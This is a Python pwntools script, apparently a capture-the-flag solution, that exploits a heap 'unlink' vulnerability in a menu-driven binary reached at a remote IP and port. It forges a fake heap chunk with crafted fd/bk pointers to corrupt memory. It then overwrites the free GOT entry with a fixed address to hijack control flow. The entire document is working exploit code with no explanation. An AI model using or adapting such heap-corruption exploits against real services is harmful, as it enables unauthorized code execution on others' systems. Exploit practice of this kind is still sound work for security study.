from pwn import *
context.log_level = 'debug'
# p = process('./unlink')
elf = ELF('./unlink')


p = remote('222.18.158.227', 33403)


def add(size,content):
    p.sendafter('Your choice is:','1')
    p.sendlineafter(':',str(size))
    p.sendafter(':',content)

def change(idx,size,content):
    p.sendafter('Your choice is:','2')
    p.sendlineafter(':',str(idx))
    p.sendlineafter(':',str(size))
    p.sendafter(':',content)

def remove(idx):
    p.sendafter('Your choice is:','3')
    p.sendlineafter(':',str(idx))


def show():
    p.sendafter('Your choice is:','4')

add(0x100,'a')#0
add(0x30,'a')#1
add(0x80,'a')#2
add(0x30,'a')

head = 0x6020c0

payload = p64(0)  #prev_size
payload += p64(0x31)  #size
payload += p64(head + 40 - 0x18 - 0x10)  #fd
payload += p64(head + 40 - 0x10 - 0x10)  #bk
payload += p64(0x20)  # next chunk's prev_size bypass the check
payload = payload.ljust(0x30, 'a')
payload += p64(0x30)
payload += '\x90'

change(1,0x50,payload)
remove(2)

payload = 'a'*8+p64(elf.got['free'])
change(1,0x10,payload)
change(0,0x6,p64(0x400d4a)[:6])
remove(3)
p.recv()
p.recv()

